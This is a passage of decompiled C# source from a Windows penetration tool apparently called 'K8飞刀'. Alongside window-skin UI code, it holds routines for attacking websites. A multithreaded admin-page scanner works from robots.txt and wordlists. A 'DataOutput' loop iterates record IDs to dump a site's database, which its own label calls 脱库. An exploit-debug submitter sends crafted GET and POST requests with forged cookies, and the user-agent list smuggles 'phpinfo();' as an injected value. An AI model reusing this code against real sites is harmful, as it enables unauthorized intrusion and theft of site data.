                    if (IsWindowsXP | IsWindows2003)
                    {
                        this.icoBtn_WebShell.Top -= 4;
                    }
                    else
                    {
                        this.icoBtn_WebShell.Top -= 4;
                    }
                    this.icoBtn_ExpDebug.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_encodeDecode.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_CookieBrowser.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_CmdShell.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_EXploitDB.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_dataOutput.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_about.Top = this.icoBtn_WebShell.Top;
                }
            }
        }

        private void K8setWebCookie(string k8url, string setCookies)
        {
            if (!string.IsNullOrEmpty(setCookies))
            {
                if (!setCookies.Contains("="))
                {
                    this.K8msgbox("请填写正确的Cookie！ 格式：参数-值 (user=k8team;pwd=k8pass)");
                }
                else
                {
                    string[] strArray = setCookies.Split(";".ToCharArray());
                    foreach (string str in strArray)
                    {
                        if (str.Trim() != "")
                        {
                            string lbszCookieName = str.Substring(0, str.IndexOf("="));
                            InternetSetCookie(k8url, lbszCookieName, str.Substring(str.IndexOf("=") + 1, (str.Length - str.IndexOf("=")) - 1) + ";Expires=Sun,22-Feb-2015 00:00:00 GMT");
                        }
                    }
                }
            }
        }

        private void K8setWebExpCookie(string k8url, string k8cookie)
        {
            string str = k8cookie;
            if (!string.IsNullOrEmpty(str))
            {
                if (!str.Contains("="))
                {
                    this.K8msgbox("请填写正确的Cookie！ 格式：参数-值 (user=k8team;pwd=k8pass)");
                }
                else
                {
                    string[] strArray = str.Split(";".ToCharArray());
                    foreach (string str2 in strArray)
                    {
                        if (str2.Trim() != "")
                        {
                            string lbszCookieName = str2.Substring(0, str2.IndexOf("="));
                            InternetSetCookie(k8url, lbszCookieName, str2.Substring(str2.IndexOf("=") + 1, (str2.Length - str2.IndexOf("=")) - 1) + ";Expires=Sun,22-Feb-2015 00:00:00 GMT");
                        }
                    }
                }
            }
        }

        public void K8SetWebUserAgent(string agent)
        {
            UrlMkSetSessionOption(0x10000001, agent, agent.Length, 0);
        }

        private void K8shellBrowserURL(string K8Browser)
        {
            if (this.lv_webShell.SelectedIndices.Count > 0)
            {
                string arguments = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[7].Text);
                try
                {
                    Process.Start(K8Browser, arguments);
                }
                catch (Exception exception)
                {
                    if (exception.Message.Contains("系统找不到指定的文件"))
                    {
                        this.K8msgbox("大哥你电脑上找不到指定的浏览器: " + K8Browser);
                    }
                }
                int index = this.lv_webShell.Items.IndexOf(this.lv_webShell.FocusedItem);
            }
        }

        private void K8singleScanAdmin()
        {
            if (this.K8urlRestore() == "noURL")
            {
                MessageBox.Show("Please enter website!\r\n请先输入网址!");
            }
            else
            {
                this.K8isAbortScanAdmin = false;
                string str = this.K8urlRestore();
                this.txt_ScanAdminResult.Text = "";
                this.DisAllowScanAdminControl();
                new Thread(new ParameterizedThreadStart(this.K8scanAdminSin)) { IsBackground = true }.Start(new List<string> { str });
            }
        }

        private void K8skin()
        {
            for (int i = 0; i < base.Controls.Count; i++)
            {
                foreach (Control control in base.Controls)
                {
                    if (control.Name.ToString().ToLower().Contains("k8skin"))
                    {
                        base.Controls.Remove(control);
                    }
                }
            }
            Application.DoEvents();
            //this.BackColor = Color.Red;
            //base.TransparencyKey = Color.Red;
            base.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            base.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            base.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.MaximizedBounds = Screen.PrimaryScreen.WorkingArea;
            Image image = new Bitmap(@"K8skin\K8LeftUpper.png");
            Panel panel = new Panel {
                Name = "K8skinLeftUpper",
                BackgroundImage = image,
                Left = 0,
                Top = 0,
                Width = image.Width,
                Height = image.Height
            };
            panel.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            panel.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            panel.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.Controls.Add(panel);
            panel.SendToBack();
            Image image2 = new Bitmap(@"K8skin\K8LeftBottom.png");
            Panel panel2 = new Panel {
                Name = "K8skinLeftBottom",
                BackgroundImage = image2,
                Left = 0,
                Top = base.Height - image2.Height,
                Width = image2.Width,
                Height = image2.Height
            };
            panel2.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            panel2.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            panel2.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.Controls.Add(panel2);
            panel2.SendToBack();
            Image image3 = new Bitmap(@"K8skin\K8RightUpper.png");
            Panel panel3 = new Panel {
                Name = "K8skinRightUpper",
                BackgroundImage = image3,
                Left = base.Width - image3.Width,
                Top = 0,
                Width = image3.Width,
                Height = image3.Height
            };
            panel3.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            panel3.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            panel3.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.Controls.Add(panel3);
            panel3.SendToBack();
            Image image4 = new Bitmap(@"K8skin\K8RightBottom.png");
            Panel panel4 = new Panel {
                Name = "K8skinRightBottom",
                BackgroundImage = image4,
                Left = base.Width - image4.Width,
                Top = base.Height - image4.Height,
                Width = image4.Width,
                Height = image4.Height
            };
            panel4.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            panel4.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            panel4.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.Controls.Add(panel4);
            panel4.SendToBack();
            Image image5 = new Bitmap(@"K8skin\K8Upper.png");
            Panel panel5 = new Panel {
                Name = "K8skinUpper",
                BackgroundImage = image5,
                Left = image.Width,
                Top = 0,
                Width = (base.Width - image.Width) - image3.Width,
                Height = image5.Height
            };
            panel5.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            panel5.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            panel5.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.Controls.Add(panel5);
            panel5.SendToBack();
            Image image6 = new Bitmap(@"K8skin\K8Left.png");
            Panel panel6 = new Panel {
                Name = "K8skinLeft",
                BackgroundImage = image6,
                Left = 0,
                Top = image.Height,
                Width = image6.Width,
                Height = (base.Height - image.Height) - image2.Height
            };
            panel6.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            panel6.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            panel6.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.Controls.Add(panel6);
            panel6.SendToBack();
            Image image7 = new Bitmap(@"K8skin\K8Right.png");
            Panel panel7 = new Panel {
                Name = "K8skinRight",
                BackgroundImage = image7,
                Left = base.Width - image7.Width,
                Top = image3.Height,
                Width = image7.Width,
                Height = (base.Height - image3.Height) - image4.Height
            };
            panel7.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            panel7.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            panel7.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.Controls.Add(panel7);
            panel7.SendToBack();
            Image image8 = new Bitmap(@"K8skin\K8Bottom.png");
            Panel panel8 = new Panel {
                Name = "K8skinBottom",
                BackgroundImage = image8,
                Left = image2.Width,
                Top = base.Height - image8.Height,
                Width = (base.Width - image2.Width) - image4.Width,
                Height = image8.Height
            };
            panel8.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            panel8.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            panel8.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.Controls.Add(panel8);
            panel8.SendToBack();
            Image image9 = new Bitmap(@"K8skin\K8Close_Move.png");
            int num2 = (base.Width - image9.Width) - 5;
            int num3 = 0;
            Panel panel9 = new Panel {
                Name = "K8skinClose_Move",
                BackgroundImage = image9,
                Left = num2,
                Top = num3 - 2,
                Width = image9.Width,
                Height = image9.Height
            };
            panel9.MouseDown += new MouseEventHandler(this.Close_MouseDown);
            panel9.MouseMove += new MouseEventHandler(this.Close_MouseMove);
            panel9.MouseUp += new MouseEventHandler(this.Close_MouseUp);
            panel9.MouseLeave += new EventHandler(this.Close_MouseLeave);
            base.Controls.Add(panel9);
            panel9.BringToFront();
            panel9.Visible = false;
            Image image10 = new Bitmap(@"K8skin\K8Close_Down.png");
            Panel panel10 = new Panel {
                Name = "K8skinClose_Down",
                BackgroundImage = image10,
                Left = num2 - 1,
                Top = num3 - 1,
                Width = image10.Width,
                Height = image10.Height
            };
            base.Controls.Add(panel10);
            panel10.BringToFront();
            panel10.Visible = false;
            Image image11 = new Bitmap(@"K8skin\K8Close_Normal.png");
            Panel panel11 = new Panel {
                Name = "K8skinClose_Normal",
                BackgroundImage = image11,
                Left = num2,
                Top = num3,
                Width = image11.Width,
                Height = image11.Height
            };
            panel11.MouseMove += new MouseEventHandler(this.Close_MouseMove);
            base.Controls.Add(panel11);
            panel11.BringToFront();
            Image image12 = new Bitmap(@"K8skin\K8Max_Move.png");
            Image image13 = new Bitmap(@"K8skin\K8Normal_Move.png");
            int num4 = (base.Width - image12.Width) - image9.Width;
            int num5 = 0;
            Panel panel12 = new Panel {
                Name = "K8skinMax_Move"
            };
            if (base.WindowState == FormWindowState.Maximized)
            {
                panel12.BackgroundImage = image13;
                panel12.Left = num4 - 2;
            }
            else if (base.WindowState == FormWindowState.Normal)
            {
                panel12.BackgroundImage = image12;
                panel12.Left = num4;
            }
            panel12.Top = num5 - 2;
            panel12.Width = image12.Width;
            panel12.Height = image12.Height;
            panel12.MouseDown += new MouseEventHandler(this.Max_MouseDown);
            panel12.MouseUp += new MouseEventHandler(this.Max_MouseUp);
            panel12.MouseLeave += new EventHandler(this.Max_MouseLeave);
            base.Controls.Add(panel12);
            panel12.BringToFront();
            panel12.Visible = false;
            Image image14 = new Bitmap(@"K8skin\K8Max_Down.png");
            Image image15 = new Bitmap(@"K8skin\K8Normal_Down.png");
            Panel panel13 = new Panel {
                Name = "K8skinMax_Down"
            };
            if (base.WindowState == FormWindowState.Maximized)
            {
                panel13.BackgroundImage = image15;
            }
            else if (base.WindowState == FormWindowState.Normal)
            {
                panel13.BackgroundImage = image14;
            }
            panel13.Left = num4 - 2;
            panel13.Top = num5 - 2;
            panel13.Width = image14.Width;
            panel13.Height = image14.Height;
            panel13.MouseDown += new MouseEventHandler(this.Max_MouseDown);
            panel13.MouseUp += new MouseEventHandler(this.Max_MouseUp);
            base.Controls.Add(panel13);
            panel13.BringToFront();
            panel13.Visible = false;
            Image image16 = new Bitmap(@"K8skin\K8Max_Normal.png");
            Image image17 = new Bitmap(@"K8skin\K8Normal_Normal.png");
            Panel panel14 = new Panel {
                Name = "K8skinMax_Normal"
            };
            if (base.WindowState == FormWindowState.Maximized)
            {
                panel14.BackgroundImage = image17;
            }
            else if (base.WindowState == FormWindowState.Normal)
            {
                panel14.BackgroundImage = image16;
            }
            panel14.Left = num4;
            panel14.Top = num5;
            panel14.Width = image16.Width;
            panel14.Height = image16.Height;
            panel14.MouseMove += new MouseEventHandler(this.Max_MouseMove);
            base.Controls.Add(panel14);
            panel14.BringToFront();
            Image image18 = new Bitmap(@"K8skin\K8Min_Move.png");
            int num6 = (((base.Width - image18.Width) - image12.Width) - image9.Width) + 2;
            int num7 = 0;
            Panel panel15 = new Panel {
                Name = "K8skinMin_Move",
                BackgroundImage = image18,
                Left = num6 - 1,
                Top = num7 - 1,
                Width = image18.Width,
                Height = image18.Height
            };
            panel15.MouseDown += new MouseEventHandler(this.Min_MouseDown);
            panel15.MouseMove += new MouseEventHandler(this.Min_MouseMove);
            panel15.MouseUp += new MouseEventHandler(this.Min_MouseUp);
            panel15.MouseLeave += new EventHandler(this.Min_MouseLeave);
            base.Controls.Add(panel15);
            panel15.BringToFront();
            panel15.Visible = false;
            Image image19 = new Bitmap(@"K8skin\K8Min_Down.png");
            Panel panel16 = new Panel {
                Name = "K8skinMin_Down",
                BackgroundImage = image19,
                Left = num6 - 2,
                Top = num7 - 2,
                Width = image19.Width,
                Height = image19.Height
            };
            base.Controls.Add(panel16);
            panel16.BringToFront();
            panel16.Visible = false;
            Image image20 = new Bitmap(@"K8skin\K8Min_Normal.png");
            Panel panel17 = new Panel {
                Name = "K8skinMin_Normal",
                BackgroundImage = image20,
                Left = num6,
                Top = num7,
                Width = image20.Width,
                Height = image20.Height
            };
            panel17.MouseMove += new MouseEventHandler(this.Min_MouseMove);
            base.Controls.Add(panel17);
            panel17.BringToFront();
            Image image21 = new Bitmap(@"K8skin\K8skinMid.png");
            Panel panel18 = new Panel {
                Name = "K8skinMid",
                BackgroundImage = image21,
                Left = image6.Width,
                Top = image5.Height,
                Width = base.Width,
                Height = base.Height
            };
            panel18.MouseDown += new MouseEventHandler(this.Form_MouseDown);
            panel18.MouseMove += new MouseEventHandler(this.Form_MouseMove);
            panel18.MouseUp += new MouseEventHandler(this.Form_MouseUp);
            base.Controls.Add(panel18);
            base.CenterToParent();
        }

        private static void K8sonThreadIsOver()
        {
            while (true)
            {
                int num;
                int num2;
                int num3;
                Thread.Sleep(0x3e8);
                ThreadPool.GetMaxThreads(out num, out num2);
                ThreadPool.GetAvailableThreads(out num3, out num2);
                if ((num - num3) == 0)
                {
                    Console.WriteLine("所有子线程结束了");
                    Thread.Sleep(100);
                    return;
                }
            }
        }

        private DateTime K8startTimeDataOut()
        {
            DateTime now = DateTime.Now;
            this.lbl_resultDataOut.Text = "脱库速度 开始: " + now.ToString();
            return now;
        }

        private DateTime K8startTimeScanAdmin()
        {
            DateTime now = DateTime.Now;
            this.lbl_ScanAdminResult.Text = "扫描速度 开始: " + now.ToString();
            return now;
        }

        public void k8submit()
        {
            this.Btn_Submit.Enabled = false;
            this.txt_Result.Clear();
            string urlString = this.txt_k8url.Text.Trim();
            if (urlString == "")
            {
                this.Btn_Submit.Enabled = true;
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                if (!urlString.Contains("http://") & !urlString.Contains("https://"))
                {
                    urlString = "http://" + urlString;
                    this.txt_k8url.Text = urlString;
                }
                this.copyExpDubugInfoURL = urlString;
                if (this.rb_none.Checked)
                {
                    urlString = urlString + this.txt_addURL.Text.Trim();
                    if (this.txt_RefererURL.Text.Trim() == "")
                    {
                        this.web_expDebugResult.Navigate(urlString);
                    }
                    else
                    {
                        this.web_expDebugResult.Navigate(urlString, "", null, "Referer: " + this.txt_RefererURL.Text.Trim());
                    }
                }
                else if (this.chk_Result_WebBrowser.Checked)
                {
                    if (this.rb_GetMethod.Checked)
                    {
                        this.WebBrowserGet();
                    }
                    else if (this.rb_PostMethod.Checked)
                    {
                        this.WebBrowserPost();
                    }
                }
                else if (this.rb_GetMethod.Checked)
                {
                    this.GetSubmit();
                }
                else if (this.rb_PostMethod.Checked)
                {
                    this.PostSubmit();
                }
                if (this.expDebugUrlChanged)
                {
                    this.lbl_expDebugInfo.Text = "Info";
                    this.pic_server.Image = this.imgListWebInfo.Images[0];
                    string httpBanner = GetHttpBanner(urlString);
                    string ip = this.GetHost2IP(urlString);
                    this.lbl_expDebugInfo.Text = "Banner: " + httpBanner + "  IP: " + ip + "  位置: " + K8IP2Area(ip) + "|";
                    int bannerIco = GetBannerIco(httpBanner);
                    this.pic_server.Image = this.imgListWebInfo.Images[bannerIco];
                    this.expDebugUrlChanged = false;
                }
            }
        }

        private string K8SubmitEncoding()
        {
            string str = this.cbb_expDebugCoding.Text.Trim().ToUpper();
            if (!str.Contains("UTF-8"))
            {
                if (str.Contains("GB2312"))
                {
                    return "936";
                }
                if (str.Contains("BIG5"))
                {
                    return "500";
                }
            }
            return "65001";
        }

        private void K8threadPoolDataOutput(int K8ThreadNum)
        {
            string str = @"\DataOutput\" + GetURLDomain(this.txt_urlDataOutput.Text.Trim()) + "_data.txt";
            string text = this.txt_urlDataOutput.Text;
            int num = 0;
            ThreadPool.SetMaxThreads(K8ThreadNum, K8ThreadNum);
            num = int.Parse(this.txt_minnum.Text.Trim());
            DateTime time = this.K8startTimeDataOut();
            while (!this.K8AbortScan)
            {
                if (num.ToString() == this.txt_maxnum.Text.Trim())
                {
                    break;
                }
                List<string> state = new List<string> {
                    text,
                    num.ToString(),
                    str,
                    time.ToShortTimeString()
                };
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.K8dataOutputMul), state);
                num++;
            }
            K8sonThreadIsOver();
            this.K8endTimeDataOut(num, time);
            this.K8AbortScan = false;
            this.btn_dataOutputMul.Enabled = true;
        }

        private void K8threadPoolScanAdmin(int K8ThreadNum)
        {
            if (this.K8urlRestore() == "noURL")
            {
                MessageBox.Show("Please enter website!\r\n请先输入网址!");
            }
            else
            {
                string str = this.K8urlRestore();
                this.txt_ScanAdminResult.Text = "";
                this.K8scanRobotstxt(str);
                string txtPath = null;
                int num = 0;
                ThreadPool.SetMaxThreads(K8ThreadNum, K8ThreadNum);
                txtPath = this.SelectAdminDic(txtPath);
                DateTime time = this.K8startTimeScanAdmin();
                StreamReader reader = null;
                FileStream stream = null;
                StringBuilder builder = null;
                try
                {
                    stream = new FileStream(txtPath, FileMode.Open, FileAccess.Read);
                    reader = new StreamReader(stream, Encoding.Default);
                    builder = new StringBuilder();
                    while (!this.K8isAbortScanAdmin)
                    {
                        string str3;
                        if (((str3 = reader.ReadLine()) == null) || this.K8isAbortScanAdmin)
                        {
                            break;
                        }
                        string str4 = str3;
                        if (str4.Length != 0)
                        {
                            ThreadPool.QueueUserWorkItem(new WaitCallback(this.K8scanAdminMul), new List<string> { str, str4, num.ToString() });
                        }
                        num++;
                    }
                    reader.Close();
                    stream.Close();
                }
                catch (Exception)
                {
                }
                K8sonThreadIsOver();
                this.K8endTimeDataOut(num, time);
            }
        }

        private string K8urlRestore()
        {
            string str = this.txt_ScanAdminURL.Text.Trim();
            str = this.txt_ScanAdminURL.Text.Trim(new char[] { '/' });
            if (str.Length == 0)
            {
                return "noURL";
            }
            if (!str.Contains("http"))
            {
                this.txt_ScanAdminURL.Text = "http://" + str;
                str = "http://" + str;
            }
            if (str.Substring(str.Length - 1, 1) != "/")
            {
                str = str + "/";
            }
            return str;
        }

        private static void K8useIExporer(string K8URL)
        {
            if (System.IO.File.Exists(@"C:\Program Files\Mozilla Firefox\firefox.exe"))
            {
                Process.Start("Firefox.EXE", K8URL);
            }
            else
            {
                Process.Start("iexplore.EXE", K8URL);
            }
        }

        public string k8userAgentDB()
        {
            if (this.Cbb_UserAgent.Text.Trim() == "Firefox 19.0")
            {
                return "Mozilla/5.0 (Windows NT 5.2; rv:19.0) Gecko/20100101 Firefox/19.0";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "IE6")
            {
                return "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "IE6(XP)")
            {
                return "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "FireFox 6.0")
            {
                return "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "IE8(XP)")
            {
                return "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; CIBA; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "Safari 4")
            {
                return "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/5";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "Chrome 25.0")
            {
                return "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "IPhone 3.0")
            {
                return "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "IPhone 4S")
            {
                return "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "Nokia C5-00(S60v3)")
            {
                return "Nokia C5-00(S60v3)=Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaC5-00/032.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko ) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "HTC Legend(Android)")
            {
                return "Mozilla/5.0 (Linux; U; Android 2.2; zh-cn; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "IPad")
            {
                return "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "IE9(Win7)")
            {
                return "User-Agent\tMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)";
            }
            if (this.Cbb_UserAgent.Text.Trim() == "百度爬虫")
            {
                return "* Baiduspider+(+http://www.baidu.com/search/spider.htm)";
            }
            if (this.Cbb_UserAgent.Text.Trim() != "MSN爬虫")
            {
                if (this.Cbb_UserAgent.Text.Trim() == "google爬虫")
                {
                    return "* Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "google爬虫2")
                {
                    return "* Googlebot/2.1 (+http://www.googlebot.com/bot.html)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "google爬虫3")
                {
                    return "* Googlebot/2.1 (+http://www.google.com/bot.html)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "雅虎中国爬虫")
                {
                    return "*Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "雅虎美国爬虫")
                {
                    return "*Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "新浪爱问爬虫1")
                {
                    return "*iaskspider/2.0(+http://iask.com/help/help_index.html”)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "新浪爱问爬虫2")
                {
                    return "*Mozilla/5.0 (compatible; iaskspider/1.0; MSIE 6.0)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "搜狗爬虫1")
                {
                    return " *Sogou web spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "搜狗爬虫2")
                {
                    return "*Sogou Push Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "网易爬虫")
                {
                    return "*Mozilla/5.0 (compatible; YodaoBot/1.0;http://www.yodao.com/help/webmaster/spider/;)";
                }
                if (this.Cbb_UserAgent.Text.Trim() == "phpinfo()")
                {
                    return "phpinfo();";
                }
            }
            return "*msnbot/1.0 (+http://search.msn.com/msnbot.htm)";
        }

        private string K8webBrowserEncoding(string k8encoding)
        {
            k8encoding = k8encoding.Trim().ToUpper();
            if (k8encoding.Contains("UNICODE".ToUpper()))
            {
                return "UNICODE";
            }
            if (!k8encoding.Contains("UTF-8".ToUpper()))
            {
                if (k8encoding.Contains("GB2312".ToUpper()))
                {
                    return "GB2312";
                }
                if (k8encoding.Contains("BIG5".ToUpper()))
                {
                    return "BIG5";
                }
                if (k8encoding.Contains("GBK".ToUpper()))
                {
                    return "GBK";
                }
                if (k8encoding.Contains("EUC-KR".ToUpper()))
                {
                    return "EUC-KR";
                }
                if (k8encoding.Contains("EUC-JP".ToUpper()))
                {
                    return "EUC-JP";
                }
                if (k8encoding.Contains("Shift_JIS".ToUpper()))
                {
                    return "Shift_JIS";
                }
                if (k8encoding.Contains("Windows-1251".ToUpper()))
                {
                    return "Windows-1251";
                }
                if (k8encoding.Contains("Windows-874".ToUpper()))
                {
                    return "Windows-874";
                }
                if (k8encoding.Contains("Windows-1258".ToUpper()))
                {
                    return "Windows-1258";
                }
                if (k8encoding.Contains("Ks_c_5601-1987".ToUpper()))
                {
                    return "Ks_c_5601-1987";
                }
                if (k8encoding.Contains("Windows-1250".ToUpper()))
                {
                    return "Windows-1250";
                }
                if (k8encoding.Contains("Windows-1251".ToUpper()))
                {
                    return "Windows-1251";
                }
                if (k8encoding.Contains("Windows-1252".ToUpper()))
                {
                    return "Windows-1252";
                }
                if (k8encoding.Contains("Windows-1253".ToUpper()))
                {
                    return "Windows-1253";
                }
                if (k8encoding.Contains("Windows-1254".ToUpper()))
                {
                    return "Windows-1254";
                }
                if (k8encoding.Contains("Windows-1255".ToUpper()))
                {
                    return "Windows-1255";
                }
                if (k8encoding.Contains("Windows-1256".ToUpper()))
                {
                    return "Windows-1256";
                }
                if (k8encoding.Contains("Windows-1257".ToUpper()))
                {
                    return "Windows-1257";
                }
                if (k8encoding.Contains("888888888".ToUpper()))
                {
                    return "8888888888";
                }
                if (k8encoding.Contains("888888888".ToUpper()))
                {
                    return "8888888888";
                }
            }
            return "UTF-8";
        }

        public string K8WebClientGetHtml(string url, string encoding)
        {
            try
            {
                byte[] bytes = new WebClient().DownloadData(url);
                return Encoding.GetEncoding(encoding).GetString(bytes);
            }
            catch (Exception)
            {
                return "k8err";
            }
        }

        public static string K8WebClientPostHtml(string url, string postString, string encoding)
        {
            byte[] bytes = Encoding.GetEncoding(encoding).GetBytes(postString);
            WebClient client = new WebClient();
            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            int length = bytes.Length;
            client.Headers.Add("ContentLength", length.ToString());
            byte[] buffer2 = client.UploadData(url, "POST", bytes);
            return Encoding.GetEncoding(encoding).GetString(buffer2);
        }

        private void lbl_AppICO_Click(object sender, EventArgs e)
        {
        }

        private void lbl_AppICO_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.lbl_AppICO, "K8飞刀");
        }

        private void loadK8skin()
        {
            try
            {
                this.K8skin();
            }
            catch (Exception)
            {
            }
        }

        private void Max_MouseDown(object sender, MouseEventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinMax_Move")
            {
                (base.Controls.Find("K8skinMax_Down", true)[0] as Panel).BringToFront();
                (base.Controls.Find("K8skinMax_Down", true)[0] as Panel).Visible = true;
            }
        }

        private void Max_MouseLeave(object sender, EventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinMax_Move")
            {
                try
                {
                    (base.Controls.Find("K8skinMax_Normal", true)[0] as Panel).BringToFront();
                    (base.Controls.Find("K8skinMax_Move", true)[0] as Panel).Visible = false;
                }
                catch (Exception)
                {
                }
            }
        }

        private void Max_MouseMove(object sender, MouseEventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinMax_Normal")
            {
                (base.Controls.Find("K8skinMax_Move", true)[0] as Panel).BringToFront();
                (base.Controls.Find("K8skinMax_Move", true)[0] as Panel).Visible = true;
            }
            else if (panel.Name == "K8skinNormal_Normal")
            {
                (base.Controls.Find("K8skinNormal_Move", true)[0] as Panel).BringToFront();
                (base.Controls.Find("K8skinNormal_Move", true)[0] as Panel).Visible = true;
            }
        }

        private void Max_MouseUp(object sender, MouseEventArgs e)
        {
            if (base.WindowState == FormWindowState.Maximized)
            {
                base.WindowState = FormWindowState.Normal;
            }
            else if (base.WindowState == FormWindowState.Normal)
            {
                base.WindowState = FormWindowState.Maximized;
            }
            this.loadK8skin();
        }

        private void mD5加密16位ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8MD5(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)), 0x10));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void mD5加密32位ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8MD5(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)), 0x20));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void Min_MouseDown(object sender, MouseEventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinMin_Move")
            {
                (base.Controls.Find("K8skinMin_Down", true)[0] as Panel).BringToFront();
                (base.Controls.Find("K8skinMin_Down", true)[0] as Panel).Visible = true;
            }
        }

        private void Min_MouseLeave(object sender, EventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinMin_Move")
            {
                (base.Controls.Find("K8skinMin_Normal", true)[0] as Panel).BringToFront();
                (base.Controls.Find("K8skinMin_Move", true)[0] as Panel).Visible = false;
            }
        }

        private void Min_MouseMove(object sender, MouseEventArgs e)
        {
            Panel panel = (Panel) sender;
